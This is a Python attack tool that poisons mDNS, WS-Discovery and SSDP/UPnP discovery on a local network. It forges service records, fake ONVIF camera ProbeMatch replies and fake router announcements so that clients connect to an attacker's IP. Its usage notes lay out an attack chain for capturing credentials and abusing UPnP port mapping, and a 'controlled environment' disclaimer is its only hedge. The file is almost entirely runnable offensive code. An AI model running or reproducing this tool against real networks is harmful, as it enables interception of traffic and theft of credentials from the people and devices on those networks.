#!/usr/bin/env python3
"""
mDNS/WS-Discovery/SSDP Poisoner - ClaudeCodeIPTool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Multicast service discovery poisoning for IoT/LAN MITM.

Protocols (from O'Reilly Practical IoT Hacking):
- mDNS: 224.0.0.251:5353 - Apple, IoT device discovery
- WS-Discovery: 239.255.255.250:3702 - IP camera (ONVIF), network printers
- SSDP/UPnP: 239.255.255.250:1900 - Smart TVs, routers, IoT devices

Attack: Forge service announcements pointing to attacker.
Clients resolve service names to our IP, connect to us instead.

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import argparse
import socket
import struct
import sys
import time
import threading
import uuid

try:
    from dnslib import DNSRecord, DNSHeader, RR, QTYPE, SRV, A, TXT
    HAS_DNSLIB = True
except ImportError:
    HAS_DNSLIB = False


# ─── mDNS Poisoner ───────────────────────────────────────────────────────────

MDNS_ADDR = "224.0.0.251"
MDNS_PORT = 5353

# mDNS multicast group setup helper
def _mdns_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", MDNS_PORT))
    mreq = struct.pack("=4sl", socket.inet_aton(MDNS_ADDR), socket.INADDR_ANY)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    return sock


class MDNSPoisoner:
    """
    mDNS service discovery poisoner.

    Listens on 224.0.0.251:5353, intercepts service queries,
    replies with forged SRV+A+TXT records pointing to attacker_ip.

    Common targets:
    - _ipps._tcp.local (network printers)
    - _http._tcp.local (web services)
    - _ssh._tcp.local  (SSH services)
    - _smb._tcp.local  (file shares)
    """

    def __init__(self, attacker_ip: str, attacker_port: int = 443,
                 targets: list = None, verbose: bool = False):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        # Default: poison all service types
        self.targets = targets or ["_ipps._tcp.local", "_http._tcp.local",
                                   "_ssh._tcp.local", "_smb._tcp.local",
                                   "_printer._tcp.local"]
        self.verbose = verbose
        self.poison_count = 0

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["POISON", "QUERY"]:
            prefix = {"POISON": "[💉]", "QUERY": "[?]", "INFO": "[*]"}.get(level, "[ ]")
            print(f"{prefix} {msg}")

    def _build_response(self, query_name: str, query_id: int) -> bytes:
        """Build forged mDNS response pointing to attacker."""
        if not HAS_DNSLIB:
            return b""

        instance = f"attacker.{query_name}"
        d = DNSRecord(DNSHeader(id=query_id, qr=1, aa=1, bitmap=33792))

        # PTR: service type → our instance
        d.add_answer(RR(
            query_name, QTYPE.PTR, ttl=120, rclass=1,
            rdata=None  # dnslib PTR
        ))
        # SRV: instance → our hostname + port
        d.add_answer(RR(
            instance, QTYPE.SRV, ttl=120, rclass=32769,
            rdata=SRV(priority=0, weight=0, port=self.attacker_port,
                      target="attacker.local")
        ))
        # A: our hostname → our IP
        d.add_answer(RR(
            "attacker.local", QTYPE.A, ttl=120, rclass=32769,
            rdata=A(self.attacker_ip)
        ))
        # TXT: optional metadata
        d.add_answer(RR(
            instance, QTYPE.TXT, ttl=4500, rclass=32769,
            rdata=TXT([f"adminurl=http://{self.attacker_ip}:{self.attacker_port}/"])
        ))

        return d.pack()

    def _build_response_raw(self, query_name: str, query_id: int) -> bytes:
        """
        Minimal raw mDNS PTR+A response (no dnslib required).

        DNS wire format:
          Header: ID(2) FLAGS(2) QDCOUNT(2) ANCOUNT(2) NSCOUNT(2) ARCOUNT(2)
          Answer: NAME PTR SRV A
        """
        def encode_name(name: str) -> bytes:
            out = b""
            for label in name.rstrip(".").split("."):
                out += bytes([len(label)]) + label.encode()
            return out + b"\x00"

        # Header: ID, QR=1 AA=1, 0 questions, 2 answers
        header = struct.pack(">HHHHHH",
            query_id, 0x8400, 0, 2, 0, 0)

        qname = encode_name(query_name)
        attacker_name = encode_name("attacker.local")

        # PTR record: query_name → attacker.local
        ptr = (qname +
               struct.pack(">HHI", 12, 1, 120) +  # TYPE=PTR CLASS=IN TTL
               struct.pack(">H", len(attacker_name)) + attacker_name)

        # A record: attacker.local → attacker_ip
        ip_bytes = socket.inet_aton(self.attacker_ip)
        arec = (attacker_name +
                struct.pack(">HHIH", 1, 1, 120, 4) +  # TYPE=A CLASS TTL RDLEN
                ip_bytes)

        return header + ptr + arec

    def _parse_query_name(self, data: bytes, offset: int) -> tuple:
        """Extract DNS name from wire format starting at offset."""
        labels = []
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if (length & 0xC0) == 0xC0:  # Pointer
                ptr = ((length & 0x3F) << 8) | data[offset + 1]
                name, _ = self._parse_query_name(data, ptr)
                labels.append(name)
                offset += 2
                break
            offset += 1
            labels.append(data[offset:offset+length].decode(errors="replace"))
            offset += length
        return ".".join(labels), offset

    def poison(self, iface: str = None):
        """Start mDNS listener and forge responses."""
        if not HAS_DNSLIB:
            print("[!] dnslib not installed: pip install dnslib")
            print("[!] Falling back to raw DNS response mode")

        sock = _mdns_socket()
        self.log(f"mDNS poisoner active on {MDNS_ADDR}:{MDNS_PORT}", "INFO")
        self.log(f"Redirecting services to {self.attacker_ip}:{self.attacker_port}", "INFO")
        self.log(f"Targeting: {', '.join(self.targets)}", "INFO")

        try:
            while True:
                data, addr = sock.recvfrom(4096)
                if len(data) < 12:
                    continue

                query_id = struct.unpack(">H", data[:2])[0]
                flags = struct.unpack(">H", data[2:4])[0]

                # Only process queries (QR=0)
                if flags & 0x8000:
                    continue

                # Parse question section
                try:
                    qname, _ = self._parse_query_name(data, 12)
                    qname_lower = qname.lower()

                    # Check if this matches a target service
                    poisonable = (
                        any(t.lower() in qname_lower for t in self.targets) or
                        "_tcp.local" in qname_lower or
                        "_udp.local" in qname_lower
                    )

                    if poisonable:
                        self.log(f"Query for {qname} from {addr[0]}", "QUERY")

                        if HAS_DNSLIB:
                            response = self._build_response(qname, query_id)
                        else:
                            response = self._build_response_raw(qname, query_id)

                        if response:
                            sock.sendto(response, (MDNS_ADDR, MDNS_PORT))
                            self.poison_count += 1
                            self.log(f"Poisoned {qname} → {self.attacker_ip}", "POISON")

                except Exception as e:
                    if self.verbose:
                        self.log(f"Parse error: {e}", "INFO")

        except KeyboardInterrupt:
            print(f"\n[+] Poisoned {self.poison_count} mDNS queries")
        finally:
            sock.close()


# ─── WS-Discovery Poisoner (ONVIF cameras, printers) ─────────────────────────

WSD_ADDR = "239.255.255.250"
WSD_PORT = 3702


class WSDiscoveryPoisoner:
    """
    WS-Discovery poisoner for ONVIF cameras, network printers.

    Protocol: SOAP/XML over UDP multicast 239.255.255.250:3702
    Forge ProbeMatch responses pretending to be IP cameras or printers.
    Targets: Milestones VMS, IP camera clients, ONVIF Device Manager.

    Attack: intercept Probe, reply with ProbeMatch pointing to our IP.
    Client connects to our fake device URL for credential capture.
    """

    PROBE_MATCH_TEMPLATE = """<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<s:Envelope
    xmlns:sc="http://schemas.xmlsoap.org/soap/encoding/"
    xmlns:s="http://www.w3.org/2003/05/soap-envelope"
    xmlns:dn="http://www.onvif.org/ver10/network/wsdl"
    xmlns:tds="http://www.onvif.org/ver10/device/wsdl"
    xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
    xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery">
<s:Header>
  <a:MessageID>urn:uuid:{msg_id}</a:MessageID>
  <a:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To>
  <a:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/ProbeMatches</a:Action>
  <a:RelatesTo>{relates_to}</a:RelatesTo>
</s:Header>
<s:Body><d:ProbeMatches><d:ProbeMatch>
  <a:EndpointReference>
    <a:Address>uuid:{endpoint_uuid}</a:Address>
  </a:EndpointReference>
  <d:Types>dn:NetworkVideoTransmitter tds:Device</d:Types>
  <d:Scopes>onvif://www.onvif.org/name/{device_name}
    onvif://www.onvif.org/location/192.168.1.1
    onvif://www.onvif.org/hardware/IP-Camera
    onvif://www.onvif.org/Profile/Streaming</d:Scopes>
  <d:XAddrs>http://{attacker_ip}/onvif/device_service</d:XAddrs>
  <d:MetadataVersion>1</d:MetadataVersion>
</d:ProbeMatch></d:ProbeMatches></s:Body></s:Envelope>"""

    def __init__(self, attacker_ip: str, device_name: str = "Amcrest-Camera",
                 verbose: bool = False):
        self.attacker_ip = attacker_ip
        self.device_name = device_name
        self.verbose = verbose
        self.poison_count = 0

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["POISON"]:
            prefix = {"POISON": "[💉]", "INFO": "[*]"}.get(level, "[ ]")
            print(f"{prefix} {msg}")

    def _extract_message_id(self, data: bytes) -> str:
        """Extract MessageID from SOAP envelope for RelatesTo."""
        try:
            text = data.decode("utf-8", errors="replace")
            import re
            m = re.search(r"<[^>]*MessageID[^>]*>([^<]+)</", text)
            return m.group(1).strip() if m else ""
        except Exception:
            return ""

    def poison(self):
        """Listen for WS-Discovery probes and forge ProbeMatch responses."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((WSD_ADDR, WSD_PORT))
        mreq = struct.pack("=4sl", socket.inet_aton(WSD_ADDR), socket.INADDR_ANY)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        self.log(f"WS-Discovery poisoner on {WSD_ADDR}:{WSD_PORT}", "INFO")
        self.log(f"Posing as: {self.device_name} → {self.attacker_ip}", "INFO")

        try:
            while True:
                data, addr = sock.recvfrom(65535)
                text = data.decode("utf-8", errors="replace")

                # Only respond to Probe messages
                if "Probe" not in text and "discover" not in text.lower():
                    continue

                relates_to = self._extract_message_id(data)
                if not relates_to:
                    continue

                self.log(f"Probe from {addr[0]}, MessageID: {relates_to[:40]}", "INFO")

                response = self.PROBE_MATCH_TEMPLATE.format(
                    msg_id=str(uuid.uuid4()),
                    relates_to=relates_to,
                    endpoint_uuid=str(uuid.uuid4()),
                    device_name=self.device_name,
                    attacker_ip=self.attacker_ip
                )

                sock.sendto(response.encode(), (WSD_ADDR, WSD_PORT))
                self.poison_count += 1
                self.log(f"Sent fake ProbeMatch to {addr[0]}", "POISON")

        except KeyboardInterrupt:
            print(f"\n[+] Sent {self.poison_count} fake ProbeMatches")
        finally:
            sock.close()


# ─── SSDP/UPnP Poisoner ──────────────────────────────────────────────────────

SSDP_ADDR = "239.255.255.250"
SSDP_PORT = 1900


class SSDPPoisoner:
    """
    SSDP/UPnP poisoner for smart TVs, routers, IoT devices.

    Sends unsolicited NOTIFY announcements claiming to be network services.
    Victims (UPnP control points) fetch our rootDesc.xml for device details.
    IGD devices allow AddPortMapping without auth - redirect ports to attacker.
    """

    NOTIFY_TEMPLATE = (
        "NOTIFY * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "CACHE-CONTROL: max-age=1800\r\n"
        "LOCATION: http://{ip}:{port}/rootDesc.xml\r\n"
        "NT: {nt}\r\n"
        "NTS: ssdp:alive\r\n"
        "SERVER: Linux/5.4 UPnP/1.1 MiniUPnP/2.1\r\n"
        "USN: uuid:{usn}::{nt}\r\n"
        "\r\n"
    )

    MSEARCH_RESPONSE = (
        "HTTP/1.1 200 OK\r\n"
        "CACHE-CONTROL: max-age=1800\r\n"
        "DATE: {date}\r\n"
        "EXT:\r\n"
        "LOCATION: http://{ip}:{port}/rootDesc.xml\r\n"
        "SERVER: Linux/5.4 UPnP/1.1 MiniUPnP/2.1\r\n"
        "ST: {st}\r\n"
        "USN: uuid:{usn}::{st}\r\n"
        "\r\n"
    )

    def __init__(self, attacker_ip: str, attacker_port: int = 8080,
                 interval: int = 10, verbose: bool = False):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.interval = interval
        self.verbose = verbose
        self.usn = str(uuid.uuid4())

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["ANNOUNCE"]:
            prefix = {"ANNOUNCE": "[📢]", "INFO": "[*]"}.get(level, "[ ]")
            print(f"{prefix} {msg}")

    def _send_notify(self, sock, nt: str):
        msg = self.NOTIFY_TEMPLATE.format(
            ip=self.attacker_ip, port=self.attacker_port,
            nt=nt, usn=self.usn
        )
        sock.sendto(msg.encode(), (SSDP_ADDR, SSDP_PORT))

    def _respond_to_msearch(self, sock, st: str, addr: tuple):
        import email.utils
        msg = self.MSEARCH_RESPONSE.format(
            date=email.utils.formatdate(usegmt=True),
            ip=self.attacker_ip, port=self.attacker_port,
            st=st, usn=self.usn
        )
        sock.sendto(msg.encode(), addr)
        self.log(f"Responded to M-SEARCH from {addr[0]}", "ANNOUNCE")

    def poison(self):
        """Broadcast fake UPnP device and respond to M-SEARCH queries."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
        sock.bind(("", SSDP_PORT))

        mreq = struct.pack("=4sl", socket.inet_aton(SSDP_ADDR), socket.INADDR_ANY)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        sock.settimeout(self.interval)

        nts = [
            "upnp:rootdevice",
            "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
            "urn:schemas-upnp-org:device:WANConnectionDevice:1",
            "urn:schemas-upnp-org:service:WANIPConnection:1",
        ]

        self.log(f"SSDP poisoner on {SSDP_ADDR}:{SSDP_PORT}", "INFO")
        self.log(f"Advertising fake IGD at http://{self.attacker_ip}:{self.attacker_port}/", "INFO")

        try:
            while True:
                # Send periodic NOTIFY
                for nt in nts:
                    self._send_notify(sock, nt)
                self.log(f"Sent {len(nts)} NOTIFY announcements", "ANNOUNCE")

                # Listen for M-SEARCH queries
                deadline = time.time() + self.interval
                while time.time() < deadline:
                    try:
                        data, addr = sock.recvfrom(4096)
                        text = data.decode("utf-8", errors="replace")
                        if "M-SEARCH" in text:
                            import re
                            st_m = re.search(r"ST:\s*(.+)", text)
                            st = st_m.group(1).strip() if st_m else "ssdp:all"
                            self._respond_to_msearch(sock, st, addr)
                    except socket.timeout:
                        break

        except KeyboardInterrupt:
            print("\n[+] SSDP poisoner stopped")
        finally:
            sock.close()


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="mDNS/WS-Discovery/SSDP Poisoner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  mdns    - mDNS service discovery poisoning (224.0.0.251:5353)
  wsd     - WS-Discovery poisoning for ONVIF cameras (239.255.255.250:3702)
  ssdp    - SSDP/UPnP poisoning for IoT/smart devices (239.255.255.250:1900)
  all     - Run all three simultaneously

Examples:
  # Poison all mDNS service queries → attacker
  sudo python3 mdns-poison.py mdns --attacker-ip 192.168.1.50 -v

  # Pose as ONVIF camera for credential capture
  sudo python3 mdns-poison.py wsd --attacker-ip 192.168.1.50 --device-name Hikvision -v

  # Broadcast fake UPnP IGD (router)
  sudo python3 mdns-poison.py ssdp --attacker-ip 192.168.1.50 --port 8080 -v

  # All protocols simultaneously
  sudo python3 mdns-poison.py all --attacker-ip 192.168.1.50 -v

Attack Chain:
  mDNS poison → client connects to attacker for service
  → mitm-suite.py captures credentials at attacker's listening port

  WS-Discovery → ONVIF client fetches fake rootDesc.xml from attacker
  → client sends SOAP auth request → credentials captured

  SSDP/UPnP → control point fetches rootDesc.xml
  → AddPortMapping call opens ports via IGD (if real router is nearby)

Protocols Covered:
  mDNS      UDP 5353 multicast 224.0.0.251 - Apple/IoT device discovery
  WS-Disc.  UDP 3702 multicast 239.255.255.250 - IP cameras, printers (ONVIF)
  SSDP/UPnP UDP 1900 multicast 239.255.255.250 - Smart TVs, routers, IoT

CONTROLLED ENVIRONMENT ONLY
        """
    )

    parser.add_argument("mode", choices=["mdns", "wsd", "ssdp", "all"])
    parser.add_argument("--attacker-ip", required=True, help="Your IP address")
    parser.add_argument("--port", type=int, default=443,
                        help="Attacker service port (default: 443)")
    parser.add_argument("--device-name", default="Amcrest-Camera",
                        help="WSD: fake device name")
    parser.add_argument("--targets", nargs="+",
                        help="mDNS: service types to poison")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    def run_mdns():
        p = MDNSPoisoner(args.attacker_ip, args.port,
                         args.targets, args.verbose)
        p.poison()

    def run_wsd():
        p = WSDiscoveryPoisoner(args.attacker_ip, args.device_name, args.verbose)
        p.poison()

    def run_ssdp():
        p = SSDPPoisoner(args.attacker_ip, args.port, verbose=args.verbose)
        p.poison()

    if args.mode == "mdns":
        run_mdns()
    elif args.mode == "wsd":
        run_wsd()
    elif args.mode == "ssdp":
        run_ssdp()
    elif args.mode == "all":
        threads = [
            threading.Thread(target=run_mdns, daemon=True),
            threading.Thread(target=run_wsd, daemon=True),
            threading.Thread(target=run_ssdp, daemon=True),
        ]
        for t in threads:
            t.start()
        print(f"[*] All poisoners active. Attacker IP: {args.attacker_ip}")
        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print("\n[+] Stopped all poisoners")


if __name__ == "__main__":
    main()
